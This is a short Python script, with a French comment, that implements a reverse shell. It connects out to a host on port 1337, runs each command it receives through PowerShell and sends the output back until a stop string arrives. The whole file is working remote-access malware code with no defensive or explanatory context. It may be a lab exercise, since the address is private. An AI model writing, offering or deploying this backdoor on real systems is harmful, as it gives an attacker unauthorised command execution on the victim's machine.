import socket
import subprocess

def connect_to_server():
    host = "192.168.0.58"
    port = 1337

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        cmd = client_socket.recv(1024).decode()
        if cmd == "end_by_raphgui":
            break

        result = subprocess.run(["powershell.exe", "-Command", cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        cmd_output = result.stdout + result.stderr

        # Supprimer les espaces excédentaires
        cmd_output = cmd_output.strip()

        client_socket.send(cmd_output.encode())

    client_socket.close()

if __name__ == '__main__':
    connect_to_server()
